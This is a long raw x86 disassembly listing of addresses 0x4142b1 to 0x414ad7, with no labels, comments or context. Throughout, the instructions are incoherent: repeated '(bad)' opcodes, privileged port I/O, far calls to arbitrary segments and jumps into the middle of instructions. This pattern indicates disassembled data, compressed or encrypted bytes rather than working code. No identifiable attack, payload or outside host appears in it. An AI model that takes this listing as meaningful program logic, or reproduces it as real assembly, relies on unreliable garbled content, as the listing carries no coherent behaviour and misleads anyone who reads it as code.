  4142b1:	call   0xe5db:0x685a362c
  4142b8:	lock add ah,ah
  4142bb:	(bad)  
  4142bc:	xchg   ebp,eax
  4142bd:	cmp    esp,edx
  4142bf:	inc    esp
  4142c0:	popf   
  4142c1:	aam    0xec
  4142c3:	mov    bl,BYTE PTR [edi]
  4142c5:	pop    esp
  4142c6:	aam    0x31
  4142c8:	out    0x83,al
  4142ca:	je     0x4142cb
  4142cc:	cdq    
  4142cd:	out    dx,eax
  4142ce:	xchg   edi,eax
  4142cf:	pop    edx
  4142d0:	adc    eax,0xd56e445d
  4142d5:	test   BYTE PTR [edi+edx*4-0x4a],ch
  4142d9:	xchg   esi,eax
  4142da:	sbb    eax,0x1aaea00c
  4142df:	mov    edx,0xedd5085e
  4142e4:	sbb    BYTE PTR ds:0xb1889e50,0xd
  4142eb:	push   0xffffff91
  4142ed:	mov    ds:0xa7b041d5,al
  4142f2:	xor    BYTE PTR [esi],ch
  4142f4:	pop    edx
  4142f5:	inc    eax
  4142f6:	fld    TBYTE PTR [ebp-0x58d97a3]
  4142fc:	jo     0x414316
  4142fe:	int    0xc8
  414300:	or     esi,DWORD PTR [ecx]
  414302:	cs jp  0x414307
  414305:	mov    dh,0xbc
  414307:	pop    ebp
  414308:	push   0xffffffbc
  41430a:	es ror ebp,cl
  41430d:	and    BYTE PTR [ebp-0xa431100],dl
  414313:	ins    BYTE PTR es:[edi],dx
  414314:	adc    ebx,ebx
  414316:	ret    0xfac4
  414319:	pop    edi
  41431a:	ds mov esp,0x6e88edf4
  414320:	dec    ebp
  414321:	inc    ebp
  414322:	out    dx,eax
  414323:	lock ret 0xddb0
  414327:	lods   eax,DWORD PTR ds:[esi]
  414328:	cli    
  414329:	stos   BYTE PTR es:[edi],al
  41432a:	pusha  
  41432b:	dec    esp
  41432c:	dec    ebx
  41432d:	sti    
  41432e:	shl    ch,1
  414330:	les    ebp,FWORD PTR [esi]
  414332:	mov    eax,0x1a2acb6d
  414337:	fdivr  QWORD PTR [edi+ebx*8+0x32976bda]
  41433e:	aad    0x45
  414340:	pop    ecx
  414341:	ins    BYTE PTR es:[edi],dx
  414342:	xchg   ebx,eax
  414343:	sub    eax,0xa265d317
  414348:	push   ebp
  414349:	cmp    al,0xf7
  41434b:	cmp    DWORD PTR [edx+ebx*1],ebx
  41434e:	mov    bh,0x6d
  414350:	jae    0x414341
  414352:	and    ecx,DWORD PTR [edx+ebx*1+0x64]
  414356:	fwait
  414357:	ins    BYTE PTR es:[edi],dx
  414358:	mov    es,WORD PTR [ebx]
  41435a:	fadd   DWORD PTR [ecx+esi*2-0x25]
  41435e:	push   esi
  41435f:	inc    esi
  414360:	xlat   BYTE PTR ds:[ebx]
  414361:	fs xchg ecx,eax
  414363:	rol    DWORD PTR [ebx+ebx*2+0x17],1
  414367:	sbb    ah,BYTE PTR ss:[edx]
  41436a:	test   DWORD PTR [ebx-0x3a],0x49a22e8f
  414371:	jbe    0x41434e
  414373:	pop    eax
  414374:	push   0xe7a1ca44
  414379:	lods   eax,DWORD PTR ds:[esi]
  41437a:	lds    edx,FWORD PTR [ebp+0x5dbce37]
  414380:	ror    BYTE PTR [ebp-0x5409d8d6],0x8d
  414387:	add    DWORD PTR [edx+0x5d],esp
  41438a:	fdivr  DWORD PTR [edx]
  41438c:	(bad)  
  41438d:	(bad)  
  41438e:	sub    DWORD PTR [eax+0xf1912fb],esp
  414394:	cmp    DWORD PTR [ebp+0x63],ebp
  414397:	or     edi,DWORD PTR [edx]
  414399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41439a:	xchg   BYTE PTR [edi],dh
  41439c:	add    BYTE PTR [edi-0x5ae5f562],ah
  4143a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a3:	fiadd  WORD PTR [edi+0x71]
  4143a6:	frstor [eax]
  4143a8:	add    DWORD PTR [ebp+0x17],ebp
  4143ab:	call   0x6ece:0xa30abcdd
  4143b2:	fcmovu st,st(4)
  4143b4:	sub    al,BYTE PTR [ecx+0x75]
  4143b7:	stos   BYTE PTR es:[edi],al
  4143b8:	icebp  
  4143b9:	mov    ebp,ecx
  4143bb:	dec    edx
  4143bc:	call   0x59df:0x36002e
  4143c3:	and    BYTE PTR [ebx+eiz*2],0x81
  4143c7:	jo     0x41438a
  4143c9:	mov    al,ds:0x1f79975c
  4143ce:	and    eax,edx
  4143d0:	inc    esp
  4143d1:	mov    ebp,DWORD PTR [eax-0x66]
  4143d4:	aad    0x64
  4143d6:	enter  0x8026,0x76
  4143da:	add    eax,eax
  4143dc:	mov    esp,0xdf80fcbc
  4143e1:	ret    0x6ac2
  4143e4:	sbb    DWORD PTR [ebx+eiz*8],0x24170491
  4143eb:	jmp    0x414412
  4143ed:	mov    al,ds:0x1a58a9b6
  4143f2:	and    al,0xef
  4143f4:	ret    
  4143f5:	jo     0x414422
  4143f7:	add    BYTE PTR [ebx+0x7d],cl
  4143fa:	cs in  al,0x8c
  4143fd:	loop   0x41443a
  4143ff:	mov    dh,0x76
  414401:	popa   
  414402:	test   eax,0x7c54110a
  414407:	and    BYTE PTR [esp+edx*8+0x5f],dh
  41440b:	sub    al,ah
  41440d:	inc    esi
  41440e:	pop    ebx
  41440f:	mov    esp,DWORD PTR [ebp-0x38]
  414412:	and    BYTE PTR [eax],ch
  414414:	add    al,0xf3
  414416:	adc    eax,0x7aaec45d
  41441b:	cli    
  41441c:	mov    al,0x1c
  41441e:	mov    BYTE PTR [edx-0x25],ah
  414421:	add    BYTE PTR [esi+ebx*1+0x57],ch
  414425:	out    0x11,eax
  414427:	and    DWORD PTR [ebp+0x1c],0x46
  41442b:	mov    ds:0x482b826a,eax
  414430:	xchg   edi,eax
  414431:	pop    edx
  414432:	shl    BYTE PTR [edi-0x5a4e12f5],1
  414438:	adc    DWORD PTR [ebp+0x62],0xffffffbf
  41443c:	retf   
  41443d:	out    0x3a,al
  41443f:	and    DWORD PTR [edx+0x620c476d],ecx
  414445:	popa   
  414446:	mov    eax,ds:0xd003415d
  41444b:	ins    DWORD PTR es:[edi],dx
  41444c:	test   eax,0x4485aae7
  414451:	dec    edx
  414452:	add    DWORD PTR [ebx+0x695b1b0b],ebx
  414458:	lea    edi,[eax-0x2]
  41445b:	xor    eax,0xd1606f1
  414460:	fs mov dh,0x9
  414463:	and    BYTE PTR [ebp+0x2bdb7168],0xe9
  41446a:	mov    dh,BYTE PTR ds:0xb6942a06
  414470:	xchg   edx,eax
  414471:	pop    eax
  414472:	pop    edi
  414473:	fidiv  WORD PTR [ebx-0x5a522498]
  414479:	jge    0x414401
  41447b:	int3   
  41447c:	popa   
  41447d:	(bad)  
  41447e:	xor    BYTE PTR [ecx-0x527a0d9d],cl
  414484:	fstp   st(2)
  414486:	ret    
  414487:	cmp    eax,0xb479c67
  41448c:	cmp    esp,DWORD PTR [edx-0x397a2ff0]
  414492:	test   esi,ecx
  414494:	push   ss
  414495:	in     al,dx
  414496:	inc    ecx
  414497:	adc    eax,0xcf1ecf91
  41449c:	test   DWORD PTR [ebp-0x495bc71f],ebp
  4144a2:	aam    0xc4
  4144a4:	jg     0x41449d
  4144a6:	xor    eax,DWORD PTR [edx+0x1b5b6e20]
  4144ac:	jb     0x414511
  4144ae:	xchg   ecx,eax
  4144af:	cmc    
  4144b0:	push   eax
  4144b1:	je     0x4144bd
  4144b3:	fstp   TBYTE PTR [esi+0x74]
  4144b6:	imul   ebp,DWORD PTR [edi-0x30e537f0],0xffffff82
  4144bd:	or     dl,BYTE PTR [ecx+esi*2-0x8]
  4144c1:	out    dx,eax
  4144c2:	(bad)  [edx-0x488cbd40]
  4144c8:	fmul   DWORD PTR [edi-0x68]
  4144cb:	push   eax
  4144cc:	xor    BYTE PTR [ebx-0x36e44bc0],ch
  4144d2:	jg     0x4144ef
  4144d4:	sub    al,0xbb
  4144d6:	pop    ebx
  4144d7:	mov    ch,0xd5
  4144d9:	adc    al,0x70
  4144db:	jp     0x41446b
  4144dd:	imul   DWORD PTR [eax]
  4144df:	(bad)  
  4144e0:	jmp    0x4144cd
  4144e2:	and    ah,al
  4144e4:	mov    dh,0x43
  4144e6:	lahf   
  4144e7:	cwde   
  4144e8:	rcr    BYTE PTR [edx],1
  4144ea:	mov    ebx,0xd6d24dbf
  4144ef:	inc    esp
  4144f0:	jne    0x414481
  4144f2:	cdq    
  4144f3:	push   ds
  4144f4:	lock cwde 
  4144f6:	add    esp,DWORD PTR [esi+esi*4+0x6eeda82e]
  4144fd:	fdivr  DWORD PTR [ebp-0x1d]
  414500:	mov    es,edx
  414502:	je     0x414529
  414504:	inc    ecx
  414505:	fnsave [esi]
  414507:	xchg   esi,eax
  414508:	sti    
  414509:	push   0x40506bd5
  41450e:	xor    ebp,DWORD PTR [ebx+0x8]
  414511:	call   0xfbcb62ec
  414516:	sub    eax,0x23cfe89a
  41451b:	jbe    0x414578
  41451d:	pusha  
  41451e:	imul   esi,DWORD PTR [eax],0xffffff97
  414521:	in     eax,dx
  414522:	mov    ebp,0x5b11f839
  414527:	mov    WORD PTR [ebx-0x52],cs
  41452a:	lods   eax,DWORD PTR ds:[esi]
  41452b:	ret    0x8b88
  41452e:	ins    DWORD PTR es:[edi],dx
  41452f:	out    dx,al
  414530:	pop    eax
  414531:	dec    edx
  414532:	fcomp  QWORD PTR [eax-0x2b92d17e]
  414538:	xchg   edi,eax
  414539:	mov    edi,0xb8536abe
  41453e:	mov    cl,0xb0
  414540:	add    eax,0xdde85112
  414545:	sbb    ebx,DWORD PTR [edx+edx*4+0x5b]
  414549:	push   edi
  41454a:	add    eax,0xcdc80d9f
  41454f:	add    eax,0xb64df252
  414554:	outs   dx,BYTE PTR ds:[esi]
  414555:	adc    al,0xb6
  414557:	xor    al,0xb3
  414559:	cmp    eax,0xc4211b07
  41455e:	mov    al,ds:0xeb61619e
  414563:	or     ch,ah
  414565:	(bad)  
  414566:	mov    edi,0x1c06371c
  41456b:	fisub  DWORD PTR [ebp+0xa55616d]
  414571:	sub    esi,DWORD PTR [edi-0x2]
  414574:	or     BYTE PTR [esp+ebx*4],ch
  414577:	jp     0x4145e7
  414579:	add    eax,0xc7efdb60
  41457e:	frstor [eax-0x31fd3d1f]
  414584:	mov    al,ds:0x7929a174
  414589:	lock adc edi,DWORD PTR [eax-0x4b]
  41458d:	clc    
  41458e:	and    BYTE PTR [eax-0x55],0x5d
  414592:	lahf   
  414593:	jns    0x41454f
  414595:	xchg   edx,eax
  414596:	mov    dl,0x45
  414598:	or     ebx,DWORD PTR [ebx-0x45]
  41459b:	aad    0x97
  41459d:	add    al,0xca
  41459f:	push   edx
  4145a0:	dec    edx
  4145a1:	(bad)  
  4145a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a4:	mov    DWORD PTR [eax],ebp
  4145a6:	mov    edx,0x274b1bb5
  4145ab:	and    bl,BYTE PTR [eax+0x2672e59]
  4145b1:	ficomp DWORD PTR [edx-0x7767ce18]
  4145b7:	out    0x29,eax
  4145b9:	jb     0x4145be
  4145bb:	les    ebp,FWORD PTR [ebp+0x6a4daed]
  4145c1:	jmp    0x3fd8c6d1
  4145c6:	fnsave [esi+0x2a596aa6]
  4145cc:	lahf   
  4145cd:	cmp    BYTE PTR [ebp-0x77559a89],dl
  4145d3:	in     eax,dx
  4145d4:	(bad)  
  4145d5:	ss add edx,ebp
  4145d8:	es jns 0x4145fb
  4145db:	inc    edi
  4145dc:	cmp    bh,bh
  4145de:	cmp    esi,DWORD PTR [esi+0x6da56c1b]
  4145e4:	sahf   
  4145e5:	imul   ebp,edi,0xffffffad
  4145e8:	cld    
  4145e9:	mov    esp,0xd2c4b2bc
  4145ee:	xchg   BYTE PTR [eax],cl
  4145f0:	cs (bad) 
  4145f2:	icebp  
  4145f3:	frstor [edi+0xd6db705]
  4145f9:	shl    BYTE PTR [eax-0x65bb99a7],1
  4145ff:	xlat   BYTE PTR ds:[ebx]
  414600:	mov    al,ds:0xdadca952
  414605:	fwait
  414606:	xor    edx,DWORD PTR [ebx-0x56]
  414609:	xchg   edi,eax
  41460a:	call   0xa281:0xb07d4f14
  414611:	push   eax
  414612:	jp     0x41459a
  414614:	lods   eax,DWORD PTR ds:[esi]
  414615:	adc    eax,0xba1e170a
  41461a:	add    eax,0xb3083970
  41461f:	jl     0x414617
  414621:	adc    BYTE PTR [ebx-0x27252291],bh
  414627:	xor    eax,0xdc7c4551
  41462c:	fcomip st,st(7)
  41462e:	(bad)  
  414630:	add    BYTE PTR [ebx+ebx*4+0x8],bh
  414634:	cs xchg ebp,eax
  414636:	dec    eax
  414637:	adc    DWORD PTR [ebx+ecx*8+0x3f],edx
  41463b:	dec    ecx
  41463c:	adc    edx,esp
  41463e:	outs   dx,BYTE PTR ds:[esi]
  41463f:	sbb    eax,0x6e495245
  414644:	out    dx,al
  414645:	fs jecxz 0x4145ed
  414648:	jbe    0x4145eb
  41464a:	inc    ebp
  41464b:	dec    DWORD PTR [esi-0x2ec7fcfd]
  414651:	sub    eax,0xbea8a554
  414656:	add    ebp,ebx
  414658:	and    BYTE PTR [eax+0x2a],bl
  41465b:	xor    al,BYTE PTR [ecx]
  41465d:	(bad)  
  41465e:	xchg   ebx,eax
  41465f:	xchg   esp,eax
  414660:	test   eax,0x1658dda8
  414665:	les    edi,FWORD PTR [esi+edi*2]
  414668:	int    0xf5
  41466a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466b:	ins    BYTE PTR es:[edi],dx
  41466c:	ins    BYTE PTR es:[edi],dx
  41466d:	fild   DWORD PTR [esi+0x7b]
  414670:	mov    esp,0x310e12b0
  414675:	scas   al,BYTE PTR es:[edi]
  414676:	jmp    0x6784:0x723ad5b0
  41467d:	loopne 0x4146ab
  41467f:	inc    ebx
  414680:	das    
  414681:	imul   ebp,DWORD PTR [eax+0x3c0db1b8],0xffffffff
  414688:	fmul   QWORD PTR [edi-0x7aee1107]
  41468e:	push   0x434f76b7
  414693:	push   esi
  414694:	push   0xd57a494c
  414699:	imul   ebp,DWORD PTR [eax+0x2cc0b5b8],0xffffffa4
  4146a0:	cs dec edx
  4146a2:	dec    esi
  4146a3:	pop    ebx
  4146a4:	inc    esp
  4146a5:	loopne 0x4146e9
  4146a7:	or     esp,DWORD PTR [edx+0x31]
  4146aa:	sub    eax,0xb03a8143
  4146af:	fst    QWORD PTR [esi]
  4146b1:	call   0x977a:0xb4ac2441
  4146b8:	and    edi,DWORD PTR [ecx-0x29393934]
  4146be:	add    al,0xe6
  4146c0:	ret    0xfd8c
  4146c3:	push   es
  4146c4:	add    al,0x3
  4146c6:	adc    ebx,ebx
  4146c8:	ret    0x4ec2
  4146cb:	or     cl,BYTE PTR [edx]
  4146cd:	mov    ?,WORD PTR [esi+edx*2+0x3d]
  4146d1:	sbb    DWORD PTR ds:0xe24a2c51,0xffffffa6
  4146d8:	jecxz  0x41471b
  4146da:	mov    dh,0x76
  4146dc:	adc    BYTE PTR [eax-0x1f],dh
  4146df:	jae    0x41472d
  4146e1:	add    cl,BYTE PTR [eax+edi*2]
  4146e4:	and    DWORD PTR [ebx],0xffffffc0
  4146e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146e8:	push   cs
  4146e9:	add    BYTE PTR [eax],cl
  4146eb:	fisub  WORD PTR [ebx]
  4146ed:	ss dec edi
  4146ef:	sti    
  4146f0:	jge    0x414754
  4146f2:	pop    es
  4146f3:	or     edi,0xe99bee28
  4146f9:	(bad)  [edx-0x6b]
  4146fc:	gs jbe 0x4146a8
  4146ff:	mov    ds:0x9a3c6a6a,eax
  414704:	jno    0x414775
  414706:	movsx  ebx,WORD PTR [ebx+0x5a]
  41470a:	fcomp  st(2)
  41470c:	pop    ebp
  41470d:	sbb    eax,0x688ea832
  414712:	stos   BYTE PTR es:[edi],al
  414713:	jb     0x4146cb
  414715:	cld    
  414716:	inc    edx
  414717:	pop    ss
  414718:	jno    0x414707
  41471a:	inc    esi
  41471b:	call   0x3e00:0x8d85d3bd
  414722:	(bad)  
  414723:	mov    dh,0xd8
  414725:	adc    al,0xb5
  414727:	push   0xffffffdc
  414729:	pop    ecx
  41472a:	hlt    
  41472b:	test   al,0x9d
  41472d:	cwde   
  41472e:	sbb    BYTE PTR [ebx+0x5b],0xbf
  414732:	cmp    BYTE PTR [esi+edi*8-0x5515a102],0x6e
  41473a:	adc    al,0xc3
  41473c:	mov    ch,0xc2
  41473e:	jmp    0xb69b7c77
  414743:	add    eax,0x67dae31a
  414748:	daa    
  414749:	inc    esi
  41474a:	pop    es
  41474b:	aam    0xad
  41474d:	push   esp
  41474e:	sbb    BYTE PTR [edi+0x7b],dh
  414751:	sub    eax,0x1b95b56f
  414756:	pop    ebx
  414757:	xchg   esp,eax
  414758:	sbb    eax,0x1f64489f
  41475d:	adc    al,0xf5
  41475f:	mov    ds:0x43b88aed,eax
  414764:	adc    al,0x2d
  414766:	mov    eax,ds:0xf94ab1cf
  41476b:	or     bl,al
  41476d:	add    eax,0x6e6a1174
  414772:	rcl    BYTE PTR [ebp+0x76],1
  414775:	imul   ebx,ebx,0x2fd1fcba
  41477b:	inc    DWORD PTR [eax-0x7c33a921]
  414781:	cmp    ebx,ebx
  414783:	push   ss
  414784:	sbb    dh,BYTE PTR [edi+0x60363e17]
  41478a:	sbb    al,0x77
  41478c:	es dec eax
  41478e:	mov    esp,0x7010752e
  414793:	sbb    al,0xe4
  414795:	jne    0x4147ea
  414797:	ja     0x41477e
  414799:	shr    BYTE PTR [esi+0x6d],cl
  41479c:	popa   
  41479d:	fisttp DWORD PTR [edi+0x7c9fb94d]
  4147a3:	loope  0x41478e
  4147a5:	sub    DWORD PTR [eax+0x6c6b668],esi
  4147ab:	and    ch,BYTE PTR [edx+0x320f4c36]
  4147b1:	or     BYTE PTR [edx],0x36
  4147b4:	adc    DWORD PTR [edi],esi
  4147b6:	popaw  
  4147b8:	test   eax,0x516c130e
  4147bd:	je     0x4147d3
  4147bf:	ins    DWORD PTR es:[edi],dx
  4147c0:	dec    eax
  4147c1:	or     eax,0x5b934388
  4147c6:	push   ebx
  4147c7:	mov    ch,0xb5
  4147c9:	add    eax,0x30a616a3
  4147ce:	xor    edi,ebx
  4147d0:	jbe    0x41483f
  4147d2:	fisttp DWORD PTR [edx]
  4147d4:	push   eax
  4147d5:	jns    0x414796
  4147d7:	sbb    dl,bh
  4147d9:	pop    edi
  4147da:	push   esi
  4147db:	sub    dh,BYTE PTR [esi]
  4147dd:	les    ecx,FWORD PTR [ebp+0x10f254ed]
  4147e3:	test   BYTE PTR [esi*2-0x792924bf],bh
  4147ea:	mov    cl,0x80
  4147ec:	jp     0x4147be
  4147ee:	dec    ebx
  4147ef:	enter  0x9cd,0xb8
  4147f3:	mov    ch,0x1d
  4147f5:	push   esp
  4147f6:	mov    bl,BYTE PTR [edx+0x5f]
  4147f9:	mov    bl,0x6f
  4147fb:	mov    WORD PTR [esi],gs
  4147fd:	mov    dh,0x52
  4147ff:	sub    al,0x91
  414801:	pushf  
  414802:	rol    DWORD PTR [eax+ebp*2],1
  414805:	push   0x295bb6d8
  41480a:	push   0x56
  41480c:	pop    ds
  41480d:	mov    al,0x5c
  41480f:	add    eax,0x6cc395
  414814:	mov    edx,0x4cf1351
  414819:	adc    al,0xbc
  41481b:	inc    esi
  41481c:	xlat   BYTE PTR ds:[ebx]
  41481d:	loopne 0x414865
  41481f:	dec    ebp
  414820:	add    DWORD PTR [edi-0x60bbc2eb],ebx
  414826:	fcom   DWORD PTR ds:0xca6d0bb0
  41482c:	adc    al,0x3
  41482e:	adc    ecx,edx
  414830:	jecxz  0x414839
  414832:	mov    ebx,0xfa331282
  414837:	pop    ecx
  414838:	inc    edi
  414839:	mov    ebx,DWORD PTR [ebx]
  41483b:	ins    DWORD PTR es:[edi],dx
  41483c:	stos   DWORD PTR es:[edi],eax
  41483d:	add    DWORD PTR [edx+0x60],esp
  414840:	jmp    DWORD PTR [ebp-0x66]
  414843:	pop    esi
  414844:	adc    DWORD PTR [eax],ecx
  414846:	pop    eax
  414847:	sub    bl,bl
  414849:	hlt    
  41484a:	sbb    DWORD PTR [ebp-0x63],esp
  41484d:	xchg   edi,eax
  41484e:	xchg   BYTE PTR [ebx-0x7c2525f8],bh
  414854:	aas    
  414855:	les    eax,FWORD PTR [edx-0x3a]
  414858:	sahf   
  414859:	lods   eax,DWORD PTR ds:[esi]
  41485a:	mov    BYTE PTR [edx+0x7],0x14
  41485e:	sti    
  41485f:	jmp    0x2725e983
  414864:	add    dh,BYTE PTR [esi-0x7670d225]
  41486a:	cwde   
  41486b:	cwde   
  41486c:	lock cmp BYTE PTR [edx+0x7],ch
  414870:	adc    eax,0x6e1750db
  414875:	data16 xor BYTE PTR [ecx-0x57fc9d4e],dl
  41487c:	mov    ecx,esp
  41487e:	sbb    bh,al
  414880:	or     eax,0xa689616
  414885:	xor    al,0xc0
  414887:	add    al,0xe1
  414889:	adc    ah,ch
  41488b:	sub    DWORD PTR [eax-0x58],ebp
  41488e:	fst    QWORD PTR [edx-0x67fd097d]
  414894:	mov    dh,0xc9
  414896:	mov    ch,BYTE PTR [ebp+0x13]
  414899:	mov    ah,0x45
  41489b:	jmp    0xdbfd:0xb6b9f97e
  4148a2:	repnz rol BYTE PTR [esi+0x3ed81c00],cl
  4148a9:	repnz add dl,bl
  4148ac:	stos   DWORD PTR es:[edi],eax
  4148ad:	and    ecx,DWORD PTR [edx*1-0x31b41a5e]
  4148b4:	jp     0x4148cd
  4148b6:	add    BYTE PTR [esi],ch
  4148b8:	jb     0x41488a
  4148ba:	push   edi
  4148bb:	sub    al,0x75
  4148bd:	mov    cl,0x5
  4148bf:	stc    
  4148c0:	repz or DWORD PTR [esi],edi
  4148c3:	not    DWORD PTR [esi+0x6d8286a5]
  4148c9:	rol    DWORD PTR [ebx-0x736b3a08],0xd7
  4148d0:	ins    DWORD PTR es:[edi],dx
  4148d1:	pop    ebx
  4148d2:	fcmovnbe st,st(7)
  4148d4:	push   cs
  4148d5:	mov    DWORD PTR [eax+0x4a],ebx
  4148d8:	mov    ecx,0xbdea979
  4148dd:	pop    edi
  4148de:	push   edx
  4148df:	mov    ds:0xa6ddb1b0,eax
  4148e4:	dec    esi
  4148e5:	and    ah,BYTE PTR [esi-0x59e4cd5d]
  4148eb:	lea    esp,[ebp+0x64b1a889]
  4148f1:	sbb    eax,0xd899d3f9
  4148f6:	dec    esp
  4148f7:	or     ebp,DWORD PTR [ecx-0x586119e9]
  4148fd:	les    esi,FWORD PTR [eax-0x4c2b5c8f]
  414903:	xor    DWORD PTR [edx+edi*4],ebp
  414906:	jmp    DWORD PTR [ecx+0x280de845]
  41490c:	inc    esp
  41490d:	scas   al,BYTE PTR es:[edi]
  41490e:	cmp    bh,BYTE PTR [esi+edx*8+0x2868521]
  414915:	outs   dx,BYTE PTR ds:[esi]
  414916:	xchg   BYTE PTR ds:0x4f7863be,cl
  41491c:	and    DWORD PTR [eax-0x25927dfb],esp
  414922:	or     esi,DWORD PTR [esi+0x6d]
  414925:	xor    eax,0x4750b044
  41492a:	shl    al,1
  41492c:	mov    es,WORD PTR [ebx]
  41492e:	mov    al,0x11
  414930:	mov    ch,0x6d
  414932:	add    DWORD PTR [ecx-0x32],edx
  414935:	int    0xe3
  414937:	les    eax,FWORD PTR [ecx-0x45]
  41493a:	jne    0x41498d
  41493c:	(bad)  
  41493e:	pop    DWORD PTR [edx+ecx*2+0x6dc6d21a]
  414945:	ret    
  414946:	sub    al,0xb7
  414948:	jnp    0x4148d6
  41494a:	(bad)  
  41494b:	iret   
  41494c:	inc    edx
  41494d:	cmp    al,0xe6
  41494f:	mov    dh,0xd0
  414951:	add    eax,0x49b037db
  414956:	retf   0x6db3
  414959:	jbe    0x4148de
  41495b:	adc    BYTE PTR [eax-0xab215f5],dh
  414961:	xor    al,0x28
  414963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414964:	mov    ah,0xed
  414966:	mov    dh,0xd0
  414968:	imul   BYTE PTR [ebx-0x7e]
  41496b:	mov    ebp,0xc5b03b8c
  414970:	cmp    edx,DWORD PTR [esi-0x5b]
  414973:	push   cs
  414974:	and    BYTE PTR [esi-0x58],ch
  414977:	jg     0x41491f
  414979:	and    eax,ecx
  41497b:	sub    DWORD PTR [edx+0x73c45c95],ebp
  414981:	(bad)  
  414982:	sbb    DWORD PTR [eax],ebx
  414984:	pop    esp
  414985:	mov    al,0x44
  414987:	sbb    ecx,DWORD PTR ds:0xfc67cf74
  41498d:	or     BYTE PTR [ebx],ch
  41498f:	pop    es
  414990:	lods   eax,DWORD PTR ds:[esi]
  414991:	test   al,0x85
  414993:	jns    0x4149f7
  414995:	enter  0xa3eb,0x5b
  414999:	stos   DWORD PTR es:[edi],eax
  41499a:	push   ss
  41499b:	scas   eax,DWORD PTR es:[edi]
  41499c:	adc    al,0x25
  41499e:	mov    eax,0xd1fd381f
  4149a3:	jbe    0x4149a6
  4149a5:	jo     0x4149bd
  4149a7:	leave  
  4149a8:	mov    ebp,0xfe62905f
  4149ad:	(bad)  
  4149ae:	in     eax,dx
  4149af:	mov    dh,0xde
  4149b1:	pop    esp
  4149b2:	xlat   BYTE PTR ds:[ebx]
  4149b3:	or     DWORD PTR [edi-0x1d21b9b0],ebp
  4149b9:	add    BYTE PTR [ebp+0x76],ch
  4149bc:	add    BYTE PTR [ebx-0x56],al
  4149bf:	ret    0x5a06
  4149c2:	pop    edx
  4149c3:	clc    
  4149c4:	ficom  DWORD PTR ds:0x9d325611
  4149ca:	pop    eax
  4149cb:	and    ch,BYTE PTR [eax-0x25]
  4149ce:	pushf  
  4149cf:	push   0xfe4b0e64
  4149d4:	push   es
  4149d5:	test   al,0x8e
  4149d7:	xchg   BYTE PTR [eax+ecx*2+0x633718db],bl
  4149de:	or     ebx,DWORD PTR [ecx+eax*8]
  4149e1:	fst    DWORD PTR [ecx+eax*1]
  4149e4:	jl     0x41497c
  4149e6:	cmp    al,0xea
  4149e8:	(bad)  
  4149e9:	inc    eax
  4149ea:	jo     0x4149b8
  4149ec:	sub    eax,0x55a43529
  4149f1:	das    
  4149f2:	and    DWORD PTR [eax+0x29],0x4f7b2ba
  4149f9:	inc    ebx
  4149fa:	xlat   BYTE PTR ds:[ebx]
  4149fb:	push   ss
  4149fc:	fisubr DWORD PTR [ebp-0x5f]
  4149ff:	mov    bl,0x2b
  414a01:	xor    edx,ebx
  414a03:	data16 mov WORD PTR [esi],?
  414a06:	and    ah,BYTE PTR [eax+0x1d]
  414a09:	push   eax
  414a0a:	aaa    
  414a0b:	ss adc eax,0x5fe24292
  414a11:	xchg   ebx,eax
  414a12:	iret   
  414a13:	ret    0xb02
  414a16:	sbb    edx,DWORD PTR [ecx+0x54]
  414a19:	jl     0x414a62
  414a1b:	arpl   cx,si
  414a1d:	jg     0x414a41
  414a1f:	fisubr DWORD PTR [esi-0x13]
  414a22:	jo     0x414a81
  414a24:	mov    dl,0x89
  414a26:	sub    al,0xd6
  414a28:	xchg   cl,ah
  414a2a:	xchg   edi,eax
  414a2b:	ss mov dh,0xba
  414a2e:	inc    ebp
  414a2f:	lods   al,BYTE PTR ds:[esi]
  414a30:	xchg   ecx,eax
  414a31:	stos   BYTE PTR es:[edi],al
  414a32:	cdq    
  414a33:	pop    eax
  414a34:	imul   edx,edx,0xffffffe9
  414a37:	mov    dh,0x6d
  414a39:	dec    ebp
  414a3a:	adc    DWORD PTR [edi],esp
  414a3c:	xchg   BYTE PTR [edi+0x652d148e],cl
  414a42:	rol    DWORD PTR [esi+0x5983db80],0x69
  414a49:	fisttp QWORD PTR [ecx]
  414a4b:	jo     0x414a15
  414a4d:	and    bh,BYTE PTR [eax+0x31e900d1]
  414a53:	cmp    al,0xd1
  414a55:	repz mov dh,0xd0
  414a58:	inc    ecx
  414a59:	cmp    esi,DWORD PTR [esi]
  414a5b:	outs   dx,BYTE PTR ds:[esi]
  414a5c:	test   al,0x7c
  414a5e:	in     al,0x79
  414a60:	dec    esi
  414a61:	adc    DWORD PTR [edx-0x3424a493],edi
  414a67:	fstp   st(5)
  414a69:	hlt    
  414a6a:	test   BYTE PTR [esi],0x7
  414a6d:	add    cl,BYTE PTR [ebx-0x24929226]
  414a73:	(bad)  
  414a74:	adc    ecx,DWORD PTR [ecx+0x6565f8cd]
  414a7a:	jmp    0xc0b65f6a
  414a7f:	push   cs
  414a80:	mov    edx,0xbb4ccbe6
  414a85:	fwait
  414a86:	jmp    0x414aa9
  414a88:	inc    esp
  414a89:	cs cmp al,0x50
  414a8c:	mov    cl,0xb9
  414a8e:	xchg   edx,eax
  414a8f:	adc    ebp,DWORD PTR [ebp+0xbc48f97]
  414a95:	pusha  
  414a96:	mov    al,ds:0x46a1d1d8
  414a9b:	in     eax,0x19
  414a9d:	fcmovnbe st,st(6)
  414a9f:	mov    eax,0x92900e6d
  414aa4:	and    al,0xef
  414aa6:	stos   DWORD PTR es:[edi],eax
  414aa7:	imul   edi,DWORD PTR [ecx+0x4d],0xffffffe8
  414aab:	mov    dh,0x21
  414aad:	add    BYTE PTR [ebp-0x1f597130],0xc7
  414ab4:	rol    DWORD PTR [eax-0x48b523fb],cl
  414aba:	and    esp,DWORD PTR [ebx-0x60]
  414abd:	inc    ecx
  414abe:	or     esp,DWORD PTR [esi-0x492d177b]
  414ac4:	xor    eax,0x5b05e807
  414ac9:	das    
  414aca:	mov    al,0xbc
  414acc:	adc    DWORD PTR [edi],eax
  414ace:	add    BYTE PTR [eax+ebp*8-0x7e],bl
  414ad2:	push   ebp
  414ad3:	jl     0x414ac9
  414ad5:	fs out dx,eax
  414ad7:	in     eax,dx
